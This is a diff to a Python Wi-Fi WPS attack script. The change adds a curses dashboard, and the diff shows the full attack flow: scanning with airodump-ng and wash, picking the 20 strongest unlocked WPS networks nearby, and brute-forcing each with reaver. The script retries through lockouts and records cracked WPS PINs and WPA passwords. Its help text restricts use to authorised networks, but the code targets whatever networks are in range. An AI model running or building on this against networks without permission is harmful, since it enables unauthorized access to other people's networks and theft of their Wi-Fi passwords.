@@ -42,6 +42,8 @@ import time
 import os
 import sys
 import re
+import curses
+from collections import deque
 from datetime import datetime
 from dataclasses import dataclass, field
 from typing import Dict, List, Optional
@@ -89,6 +91,227 @@ class AttackResult:
     retries: int
     current_pin: str = "-"
     pin_progress: int = 0  # Percentage 0-100
+
+
+# ---------------------------------------------------------
+# TUI Manager
+# ---------------------------------------------------------
+
+class WifiAuditTUI:
+    """Curses-based TUI manager for htop-style non-scrolling display."""
+
+    def __init__(self, stdscr):
+        self.stdscr = stdscr
+        self.output_buffer = deque(maxlen=50)  # Keep last 50 lines
+        self.enabled = True
+
+        # Initialize curses colors
+        try:
+            curses.start_color()
+            curses.use_default_colors()
+            curses.init_pair(1, curses.COLOR_GREEN, -1)   # Success
+            curses.init_pair(2, curses.COLOR_RED, -1)     # Failed/Error
+            curses.init_pair(3, curses.COLOR_YELLOW, -1)  # Warning
+            curses.init_pair(4, curses.COLOR_CYAN, -1)    # Info
+            curses.init_pair(5, curses.COLOR_MAGENTA, -1) # In Progress
+        except:
+            # Color support not available
+            pass
+
+        # Hide cursor
+        try:
+            curses.curs_set(0)
+        except:
+            pass
+
+        # Set nodelay for non-blocking input
+        self.stdscr.nodelay(True)
+
+    def add_output_line(self, line: str):
+        """Add a line to the output buffer."""
+        if not self.enabled:
+            print(line)
+            return
+        self.output_buffer.append(line)
+
+    def get_color_for_line(self, line: str) -> int:
+        """Determine color pair based on line content."""
+        if "[+]" in line or "SUCCESS" in line:
+            return curses.color_pair(1)  # Green
+        elif "[!]" in line or "WARNING" in line or "Failed" in line:
+            return curses.color_pair(2)  # Red
+        elif "Trying pin" in line or "IN_PROGRESS" in line:
+            return curses.color_pair(5)  # Magenta
+        elif "[*]" in line:
+            return curses.color_pair(4)  # Cyan
+        return 0
+
+    def draw_header(self, stats: Dict, y_offset: int = 0) -> int:
+        """Draw header with overall stats. Returns next y position."""
+        max_y, max_x = self.stdscr.getmaxyx()
+        y = y_offset
+
+        try:
+            # Title
+            header = "=== WiFi WPS Attack Progress ==="
+            self.stdscr.addstr(y, 0, header.ljust(max_x - 1), curses.A_BOLD)
+            y += 1
+
+            # Stats
+            total = stats['total']
+            completed = stats['completed']
+            percent = int((completed / total) * 100) if total > 0 else 0
+
+            stats_line = f"Overall: [{completed}/{total}] ({percent}%) | Success: {stats['success']} | Failed: {stats['failed']} | Locked: {stats['locked']}"
+            self.stdscr.addstr(y, 0, stats_line.ljust(max_x - 1))
+            y += 1
+
+            # Separator
+            separator = "=" * (max_x - 1)
+            self.stdscr.addstr(y, 0, separator)
+            y += 1
+
+        except curses.error:
+            pass
+
+        return y
+
+    def draw_targets_table(self, results: List[AttackResult], y_offset: int) -> int:
+        """Draw targets table. Returns next y position."""
+        max_y, max_x = self.stdscr.getmaxyx()
+        y = y_offset
+
+        try:
+            # Table header
+            header = f"{'#':<3} | {'ESSID':<20} | {'BSSID':<17} | {'Session':<12} | {'Result/Progress':<45}"
+            self.stdscr.addstr(y, 0, header[:max_x - 1], curses.A_BOLD)
+            y += 1
+
+            # Separator
+            separator = "-" * (max_x - 1)
+            self.stdscr.addstr(y, 0, separator)
+            y += 1
+
+            # Table rows (show as many as fit on screen)
+            table_start_y = y
+            available_rows = max_y - y - 10  # Reserve 10 lines for output window
+
+            for idx, result in enumerate(results):
+                if y >= table_start_y + available_rows:
+                    break
+
+                num = f"{result.target_num}"
+                essid = result.essid[:20]
+                bssid = result.bssid
+
+                # Session status
+                if result.status == "PENDING":
+                    session = "Pending"
+                elif result.status == "IN_PROGRESS":
+                    session = "In Progress"
+                elif result.status in ["SUCCESS", "FAILED", "LOCKED"]:
+                    session = "Completed"
+                else:
+                    session = result.status
+
+                # Result/Progress column
+                if result.status == "PENDING":
+                    progress = "-"
+                    color = 0
+                elif result.status == "IN_PROGRESS":
+                    if result.current_pin != "-":
+                        progress = f"PIN: {result.current_pin} | {result.pin_progress}%"
+                    else:
+                        progress = "Initializing..."
+                    color = curses.color_pair(5)  # Magenta
+                elif result.status == "SUCCESS":
+                    progress = f"SUCCESS | PIN: {result.wps_pin}"
+                    color = curses.color_pair(1)  # Green
+                elif result.status == "LOCKED":
+                    progress = "LOCKED (rate limiting)"
+                    color = curses.color_pair(2)  # Red
+                elif result.status == "FAILED":
+                    progress = "FAILED"
+                    color = curses.color_pair(2)  # Red
+                else:
+                    progress = result.status
+                    color = 0
+
+                row = f"{num:<3} | {essid:<20} | {bssid:<17} | {session:<12} | {progress:<45}"
+                self.stdscr.addstr(y, 0, row[:max_x - 1], color)
+                y += 1
+
+        except curses.error:
+            pass
+
+        return y
+
+    def draw_output_window(self, y_offset: int):
+        """Draw the live output window."""
+        max_y, max_x = self.stdscr.getmaxyx()
+
+        try:
+            # Output window header
+            y = y_offset
+            separator = "=" * (max_x - 1)
+            self.stdscr.addstr(y, 0, separator)
+            y += 1
+
+            header = "=== Live Reaver Output (Last 50 lines) ==="
+            self.stdscr.addstr(y, 0, header.ljust(max_x - 1), curses.A_BOLD)
+            y += 1
+
+            separator = "=" * (max_x - 1)
+            self.stdscr.addstr(y, 0, separator)
+            y += 1
+
+            # Draw output lines (most recent at bottom)
+            output_start_y = y
+            available_lines = max_y - y - 1
+
+            # Get the last N lines that fit
+            lines_to_show = list(self.output_buffer)[-available_lines:]
+
+            for line in lines_to_show:
+                if y >= max_y - 1:
+                    break
+
+                color = self.get_color_for_line(line)
+                # Truncate line to fit screen width
+                display_line = line[:max_x - 1]
+                self.stdscr.addstr(y, 0, display_line, color)
+                y += 1
+
+        except curses.error:
+            pass
+
+    def refresh_display(self, results: List[AttackResult], stats: Dict):
+        """Refresh the entire display."""
+        if not self.enabled:
+            return
+
+        try:
+            # Clear screen
+            self.stdscr.clear()
+
+            # Draw components
+            y = 0
+            y = self.draw_header(stats, y)
+            y = self.draw_targets_table(results, y)
+            self.draw_output_window(y)
+
+            # Refresh screen
+            self.stdscr.refresh()
+
+        except curses.error:
+            pass
+
+    def print(self, message: str):
+        """Print a message (adds to output buffer and refreshes)."""
+        if not self.enabled:
+            print(message)
+            return
+        self.add_output_line(message)
 
 
 # ---------------------------------------------------------
@@ -176,11 +399,11 @@ def count_aps_in_csv(csv_file: str) -> int:
         return _last_known_count
 
 
-def run_airodump(interface: str, duration: int, prefix: str) -> str:
+def run_airodump(interface: str, duration: int, prefix: str, tui=None) -> str:
     """Run airodump-ng for `duration` sec and save CSV."""
     csv_path = f"{prefix}-01.csv"
 
-    print(f"[+] Running airodump-ng for {duration} seconds...")
+    tui_print(f"[+] Running airodump-ng for {duration} seconds...", tui)
 
     # Run airodump in background (it needs a TTY for display, so we suppress output)
     proc = subprocess.Popen(
@@ -203,14 +426,21 @@ def run_airodump(interface: str, duration: int, prefix: str) -> str:
         # Count SSIDs discovered so far
         ssid_count = count_aps_in_csv(csv_path)
 
-        print(f"\r[SCAN] |{bar}| {percent}% ({elapsed}/{duration}s) | SSIDs: {ssid_count}", end="", flush=True)
+        msg = f"[SCAN] |{bar}| {percent}% ({elapsed}/{duration}s) | SSIDs: {ssid_count}"
+        if tui and tui.enabled:
+            tui.add_output_line(msg)
+        else:
+            print(f"\r{msg}", end="", flush=True)
 
         if elapsed >= duration:
             break
         time.sleep(0.5)
 
     proc.wait()
-    print("\n[+] Finished airodump scan.")
+
+    if not (tui and tui.enabled):
+        print()  # Newline for legacy mode
+    tui_print("[+] Finished airodump scan.", tui)
     return csv_path
 
 
@@ -282,9 +512,9 @@ def parse_airodump_csv(csv_file: str) -> Dict[str, AccessPoint]:
     return aps
 
 
-def run_wash(interface: str, duration: int = 120) -> Dict[str, Dict[str, str]]:
+def run_wash(interface: str, duration: int = 120, tui=None) -> Dict[str, Dict[str, str]]:
     """Run wash and collect WPS + Locked data."""
-    print(f"[+] Running wash for {duration} seconds (WPS lock validation)...")
+    tui_print(f"[+] Running wash for {duration} seconds (WPS lock validation)...", tui)
 
     # Run wash in background
     proc = subprocess.Popen(
@@ -303,21 +533,28 @@ def run_wash(interface: str, duration: int = 120) -> Dict[str, Dict[str, str]]:
         filled = int(bar_width * progress)
         bar = "█" * filled + "░" * (bar_width - filled)
         percent = int(progress * 100)
-        print(f"\r[WASH] |{bar}| {percent}% ({elapsed}/{duration}s)", end="", flush=True)
+
+        msg = f"[WASH] |{bar}| {percent}% ({elapsed}/{duration}s)"
+        if tui and tui.enabled:
+            tui.add_output_line(msg)
+        else:
+            print(f"\r{msg}", end="", flush=True)
 
         if elapsed >= duration:
             break
         time.sleep(0.5)
 
     proc.wait()
-    print()  # New line after progress bar
+
+    if not (tui and tui.enabled):
+        print()  # New line after progress bar for legacy mode
 
     # Get the output
     try:
         output, _ = proc.communicate(timeout=5)
         output = output.decode()
     except:
-        print("[!] wash failed or interface busy.")
+        tui_print("[!] wash failed or interface busy.", tui)
         return {}
 
     wps_data = {}
@@ -354,26 +591,44 @@ def detect_wps_lock(output_line: str) -> bool:
     return any(pattern in output_line for pattern in lock_patterns)
 
 
-def wait_with_countdown(seconds: int, reason: str = "WPS lock detected"):
+def tui_print(message: str, tui=None):
+    """Print message using TUI if available, otherwise regular print."""
+    if tui and tui.enabled:
+        tui.add_output_line(message)
+    else:
+        print(message)
+
+
+def wait_with_countdown(seconds: int, reason: str = "WPS lock detected", tui=None):
     """Display countdown timer."""
-    print(f"\n[!] {reason}, waiting {seconds // 60} minutes...")
+    tui_print(f"\n[!] {reason}, waiting {seconds // 60} minutes...", tui)
     end_time = time.time() + seconds
 
     while time.time() < end_time:
         remaining = int(end_time - time.time())
         mins, secs = divmod(remaining, 60)
-        print(f"\r[WAIT] {mins:02d}:{secs:02d} remaining...", end="", flush=True)
-        time.sleep(1)
+        msg = f"[WAIT] {mins:02d}:{secs:02d} remaining..."
+        if tui and tui.enabled:
+            tui.add_output_line(msg)
+            time.sleep(1)
+        else:
+            print(f"\r{msg}", end="", flush=True)
+            time.sleep(1)
 
-    print("\n[+] Resuming attack...")
+    tui_print("[+] Resuming attack...", tui)
 
 
-def update_targets_table(results: List[AttackResult], stats: Dict):
+def update_targets_table(results: List[AttackResult], stats: Dict, tui=None):
     """
     Update and display the fixed targets table at top of screen.
     This shows all targets with their current status and progress.
     """
-    # Move cursor to home position and clear screen
+    # Use TUI if available, otherwise fallback to legacy print mode
+    if tui and tui.enabled:
+        tui.refresh_display(results, stats)
+        return
+
+    # Legacy mode (--no-curses): Move cursor to home position and clear screen
     print("\033[2J\033[H", end="", flush=True)
 
     # Header
@@ -433,7 +688,7 @@ def update_targets_table(results: List[AttackResult], stats: Dict):
 
 def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackResult,
                       stats: Dict, all_results: List[AttackResult],
-                      max_retries: int = 10, verbose: bool = False) -> AttackResult:
+                      max_retries: int = 10, verbose: bool = False, tui=None) -> AttackResult:
     """
     Run reaver against a single target with lock detection/retry logic.
     Updates result_obj in real-time for live progress display.
@@ -442,7 +697,7 @@ def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackRes
     retry_count = 0
     use_no_association = True
 
-    print(f"[+] Starting attack on {target.essid} ({target.bssid})")
+    tui_print(f"[+] Starting attack on {target.essid} ({target.bssid})", tui)
 
     while retry_count <= max_retries:
         # Build reaver command
@@ -457,9 +712,9 @@ def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackRes
 
         if use_no_association:
             cmd.append("-N")
-            print(f"[*] Attempt {retry_count + 1}/{max_retries + 1} (no-association mode)")
+            tui_print(f"[*] Attempt {retry_count + 1}/{max_retries + 1} (no-association mode)", tui)
         else:
-            print(f"[*] Attempt {retry_count + 1}/{max_retries + 1} (direct association mode)")
+            tui_print(f"[*] Attempt {retry_count + 1}/{max_retries + 1} (direct association mode)", tui)
 
         try:
             proc = subprocess.Popen(
@@ -478,6 +733,7 @@ def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackRes
             total_pins = 11000  # Approximate total WPS PINs to try
 
             # Monitor output
+            last_refresh = time.time()
             while True:
                 line = proc.stdout.readline()
                 if not line and proc.poll() is not None:
@@ -492,7 +748,7 @@ def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackRes
                         should_print = True
 
                     if should_print:
-                        print(line.rstrip())
+                        tui_print(line.rstrip(), tui)
 
                     # Extract current PIN being tested
                     pin_match = re.search(r"Trying pin[:\s]+['\"]?(\d{8})['\"]?", line, re.IGNORECASE)
@@ -504,8 +760,15 @@ def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackRes
 
                         # Update table every 10 PINs to avoid excessive redraws
                         if pins_tried % 10 == 0:
-                            update_targets_table(all_results, stats)
+                            update_targets_table(all_results, stats, tui)
+                            last_refresh = time.time()
 
+                # Refresh display periodically even without new output (for TUI mode)
+                if tui and tui.enabled and (time.time() - last_refresh) > 2:
+                    update_targets_table(all_results, stats, tui)
+                    last_refresh = time.time()
+
+                if line:
                     # Check for success
                     if "[+] WPS PIN:" in line:
                         match = re.search(r"WPS PIN: '(\d+)'", line)
@@ -514,7 +777,7 @@ def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackRes
                             result_obj.wps_pin = wps_pin
                             result_obj.pin_progress = 100
                             last_progress_time = time.time()
-                            update_targets_table(all_results, stats)
+                            update_targets_table(all_results, stats, tui)
 
                     if "[+] WPA PSK:" in line:
                         match = re.search(r"WPA PSK: '(.+)'", line)
@@ -522,7 +785,7 @@ def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackRes
                             password = match.group(1)
                             result_obj.password = password
                             last_progress_time = time.time()
-                            update_targets_table(all_results, stats)
+                            update_targets_table(all_results, stats, tui)
 
                     # Check for lock
                     if detect_wps_lock(line):
@@ -538,7 +801,7 @@ def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackRes
 
                 # Check if stuck (no progress for 60 seconds)
                 if time.time() - last_progress_time > 60:
-                    print("[!] No progress for 60 seconds, assuming locked")
+                    tui_print("[!] No progress for 60 seconds, assuming locked", tui)
                     locked = True
                     proc.kill()
                     break
@@ -548,9 +811,9 @@ def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackRes
             # Check if we succeeded
             if wps_pin:
                 elapsed = time.time() - start_time
-                print(f"[+] SUCCESS! WPS PIN: {wps_pin}")
+                tui_print(f"[+] SUCCESS! WPS PIN: {wps_pin}", tui)
                 if password:
-                    print(f"[+] Password: {password}")
+                    tui_print(f"[+] Password: {password}", tui)
 
                 result_obj.status = "SUCCESS"
                 result_obj.wps_pin = wps_pin
@@ -558,12 +821,12 @@ def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackRes
                 result_obj.time_spent = elapsed
                 result_obj.retries = retry_count
                 result_obj.pin_progress = 100
-                update_targets_table(all_results, stats)
+                update_targets_table(all_results, stats, tui)
                 return result_obj
 
             # Handle association failure - switch modes
             if association_failed and use_no_association:
-                print("[!] No-association mode failed, switching to direct association")
+                tui_print("[!] No-association mode failed, switching to direct association", tui)
                 use_no_association = False
                 continue
 
@@ -571,27 +834,27 @@ def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackRes
             if locked:
                 retry_count += 1
                 if retry_count <= max_retries:
-                    wait_with_countdown(300, "WPS lock detected")  # 5 minutes
+                    wait_with_countdown(300, "WPS lock detected", tui)  # 5 minutes
                     use_no_association = True  # Reset to no-association for retry
                 else:
-                    print(f"[!] Max retries ({max_retries}) reached, target locked")
+                    tui_print(f"[!] Max retries ({max_retries}) reached, target locked", tui)
                     elapsed = time.time() - start_time
                     result_obj.status = "LOCKED"
                     result_obj.wps_pin = "-"
                     result_obj.password = "-"
                     result_obj.time_spent = elapsed
                     result_obj.retries = retry_count
-                    update_targets_table(all_results, stats)
+                    update_targets_table(all_results, stats, tui)
                     return result_obj
             else:
                 # Failed for other reasons
                 retry_count += 1
                 if retry_count <= max_retries:
-                    print(f"[!] Attack failed, retrying ({retry_count}/{max_retries})...")
+                    tui_print(f"[!] Attack failed, retrying ({retry_count}/{max_retries})...", tui)
                     time.sleep(5)
 
         except Exception as e:
-            print(f"[!] Error during attack: {e}")
+            tui_print(f"[!] Error during attack: {e}", tui)
             retry_count += 1
             if retry_count <= max_retries:
                 time.sleep(5)
@@ -603,7 +866,7 @@ def run_reaver_attack(target: AccessPoint, interface: str, result_obj: AttackRes
     result_obj.password = "-"
     result_obj.time_spent = elapsed
     result_obj.retries = retry_count
-    update_targets_table(all_results, stats)
+    update_targets_table(all_results, stats, tui)
     return result_obj
 
 
@@ -698,7 +961,138 @@ def print_results_table(results: List[AttackResult]):
 # Main
 # ---------------------------------------------------------
 
+def run_main_logic(args, tui=None):
+    """Main logic that can run with or without TUI."""
+    # Check if interface is in monitor mode
+    tui_print("[*] Checking interface mode...", tui)
+    if not check_monitor_mode(args.interface):
+        tui_print(f"[!] Error: Interface {args.interface} is not in monitor mode", tui)
+        tui_print("[!] Please enable monitor mode first (e.g., 'sudo airmon-ng start wlan0')", tui)
+        sys.exit(1)
+    tui_print(f"[+] Interface {args.interface} is in monitor mode", tui)
+
+    # Run airodump scan
+    csv_file = run_airodump(args.interface, args.airodump_duration, args.output_prefix, tui)
+    aps = parse_airodump_csv(csv_file)
+
+    # Use wash-duration if specified, otherwise use same duration as airodump
+    wash_duration = args.wash_duration if args.wash_duration is not None else args.airodump_duration
+    wps_info = run_wash(args.interface, wash_duration, tui)
+
+    # Merge WPS + Locked info (wash overrides airodump for more reliable lock detection)
+    for bssid, ap in aps.items():
+        if bssid in wps_info:
+            # wash provides more reliable WPS lock detection than airodump
+            ap.wps = wps_info[bssid]["wps"]
+            ap.locked = wps_info[bssid]["locked"]
+        # If airodump detected WPS but wash didn't find it, keep airodump's values
+
+    # Sort strongest first (PWR closer to 0)
+    sorted_aps = sorted(aps.values(), key=lambda x: x.pwr, reverse=True)
+
+    # Display passive scan results (only in non-TUI mode or before TUI starts)
+    if not tui or not tui.enabled:
+        print_table(sorted_aps)
+
+    # If passive mode, stop here
+    if args.passive:
+        tui_print("[*] Passive mode - no attacks will be performed", tui)
+        return
+
+    # Filter for WPS-enabled targets that are not locked
+    wps_targets = [
+        ap for ap in sorted_aps
+        if ap.wps != "?" and ap.locked != "Yes"
+    ]
+
+    if not wps_targets:
+        tui_print("[!] No WPS-enabled targets found", tui)
+        return
+
+    # Take top 20
+    targets = wps_targets[:20]
+    tui_print(f"\n[+] Found {len(wps_targets)} WPS-enabled targets", tui)
+    tui_print(f"[+] Attacking top {len(targets)} targets\n", tui)
+
+    # Initialize progress stats
+    stats = {
+        'total': len(targets),
+        'completed': 0,
+        'success': 0,
+        'failed': 0,
+        'locked': 0,
+        'current_target': None,
+        'current_index': 0
+    }
+
+    # Initialize all results as PENDING
+    results = []
+    for idx, target in enumerate(targets, 1):
+        results.append(AttackResult(
+            target_num=idx,
+            bssid=target.bssid,
+            essid=target.essid,
+            channel=target.channel,
+            status="PENDING",
+            wps_pin="-",
+            password="-",
+            time_spent=0.0,
+            retries=0
+        ))
+
+    # Display initial table
+    update_targets_table(results, stats, tui)
+    time.sleep(2)  # Give user time to see the initial state
+
+    # Attack each target
+    for idx, target in enumerate(targets, 1):
+        stats['current_target'] = target
+        stats['current_index'] = idx
+
+        # Mark current target as IN_PROGRESS
+        results[idx - 1].status = "IN_PROGRESS"
+        update_targets_table(results, stats, tui)
+
+        # Run attack (pass the result object for live updates)
+        result = run_reaver_attack(
+            target,
+            args.interface,
+            results[idx - 1],
+            stats,
+            results,
+            max_retries=10,
+            verbose=args.verbose,
+            tui=tui
+        )
+
+        # Update stats
+        stats['completed'] += 1
+        if result.status == "SUCCESS":
+            stats['success'] += 1
+        elif result.status == "LOCKED":
+            stats['locked'] += 1
+        else:
+            stats['failed'] += 1
+
+        # Final table update for this target
+        update_targets_table(results, stats, tui)
+
+    # Exit curses mode before showing final results
+    if tui and tui.enabled:
+        # Disable TUI to allow normal printing
+        tui.enabled = False
+
+    # Display final results
+    print_results_table(results)
+
+    # Save results to file
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    log_filename = f"wifi_audit_results_{timestamp}.txt"
+    save_results_to_file(results, args.interface, log_filename)
+
+
 def main():
+    """Main entry point with argument parsing."""
     parser = argparse.ArgumentParser(
         description='WiFi WPS penetration testing tool - Scans and attacks WPS-enabled networks',
         epilog='WARNING: Only use on networks you own or have authorization to test.',
@@ -740,127 +1134,42 @@ def main():
         action="store_true",
         help="show all reaver output lines (default: important lines only)"
     )
+    parser.add_argument(
+        "--no-curses",
+        action="store_true",
+        help="disable curses TUI, use legacy scrolling output (for debugging or compatibility)"
+    )
     args = parser.parse_args()
 
-    # Check if interface is in monitor mode
-    print("[*] Checking interface mode...")
-    if not check_monitor_mode(args.interface):
-        print(f"[!] Error: Interface {args.interface} is not in monitor mode")
-        print("[!] Please enable monitor mode first (e.g., 'sudo airmon-ng start wlan0')")
-        sys.exit(1)
-    print(f"[+] Interface {args.interface} is in monitor mode")
+    # Decide whether to use curses or not
+    use_curses = not args.no_curses and not args.passive
 
-    # Run airodump scan
-    csv_file = run_airodump(args.interface, args.airodump_duration, args.output_prefix)
-    aps = parse_airodump_csv(csv_file)
+    if use_curses:
+        # Run with curses TUI
+        def curses_main(stdscr):
+            tui = WifiAuditTUI(stdscr)
+            try:
+                run_main_logic(args, tui)
+            except KeyboardInterrupt:
+                tui.enabled = False
+                print("\n[!] Interrupted by user")
+            except Exception as e:
+                tui.enabled = False
+                print(f"\n[!] Error: {e}")
+                raise
 
-    # Use wash-duration if specified, otherwise use same duration as airodump
-    wash_duration = args.wash_duration if args.wash_duration is not None else args.airodump_duration
-    wps_info = run_wash(args.interface, wash_duration)
-
-    # Merge WPS + Locked info (wash overrides airodump for more reliable lock detection)
-    for bssid, ap in aps.items():
-        if bssid in wps_info:
-            # wash provides more reliable WPS lock detection than airodump
-            ap.wps = wps_info[bssid]["wps"]
-            ap.locked = wps_info[bssid]["locked"]
-        # If airodump detected WPS but wash didn't find it, keep airodump's values
-
-    # Sort strongest first (PWR closer to 0)
-    sorted_aps = sorted(aps.values(), key=lambda x: x.pwr, reverse=True)
-
-    # Display passive scan results
-    print_table(sorted_aps)
-
-    # If passive mode, stop here
-    if args.passive:
-        print("[*] Passive mode - no attacks will be performed")
-        return
-
-    # Filter for WPS-enabled targets that are not locked
-    wps_targets = [
-        ap for ap in sorted_aps
-        if ap.wps != "?" and ap.locked != "Yes"
-    ]
-
-    if not wps_targets:
-        print("[!] No WPS-enabled targets found")
-        return
-
-    # Take top 20
-    targets = wps_targets[:20]
-    print(f"\n[+] Found {len(wps_targets)} WPS-enabled targets")
-    print(f"[+] Attacking top {len(targets)} targets\n")
-
-    # Initialize progress stats
-    stats = {
-        'total': len(targets),
-        'completed': 0,
-        'success': 0,
-        'failed': 0,
-        'locked': 0,
-        'current_target': None,
-        'current_index': 0
-    }
-
-    # Initialize all results as PENDING
-    results = []
-    for idx, target in enumerate(targets, 1):
-        results.append(AttackResult(
-            target_num=idx,
-            bssid=target.bssid,
-            essid=target.essid,
-            channel=target.channel,
-            status="PENDING",
-            wps_pin="-",
-            password="-",
-            time_spent=0.0,
-            retries=0
-        ))
-
-    # Display initial table
-    update_targets_table(results, stats)
-    time.sleep(2)  # Give user time to see the initial state
-
-    # Attack each target
-    for idx, target in enumerate(targets, 1):
-        stats['current_target'] = target
-        stats['current_index'] = idx
-
-        # Mark current target as IN_PROGRESS
-        results[idx - 1].status = "IN_PROGRESS"
-        update_targets_table(results, stats)
-
-        # Run attack (pass the result object for live updates)
-        result = run_reaver_attack(
-            target,
-            args.interface,
-            results[idx - 1],
-            stats,
-            results,
-            max_retries=10,
-            verbose=args.verbose
-        )
-
-        # Update stats
-        stats['completed'] += 1
-        if result.status == "SUCCESS":
-            stats['success'] += 1
-        elif result.status == "LOCKED":
-            stats['locked'] += 1
-        else:
-            stats['failed'] += 1
-
-        # Final table update for this target
-        update_targets_table(results, stats)
-
-    # Display final results
-    print_results_table(results)
-
-    # Save results to file
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    log_filename = f"wifi_audit_results_{timestamp}.txt"
-    save_results_to_file(results, args.interface, log_filename)
+        try:
+            curses.wrapper(curses_main)
+        except Exception as e:
+            print(f"[!] Curses initialization failed: {e}")
+            print("[!] Falling back to legacy mode...")
+            run_main_logic(args, None)
+    else:
+        # Run without curses (legacy mode or passive mode)
+        try:
+            run_main_logic(args, None)
+        except KeyboardInterrupt:
+            print("\n[!] Interrupted by user")
 
 
 if __name__ == "__main__":
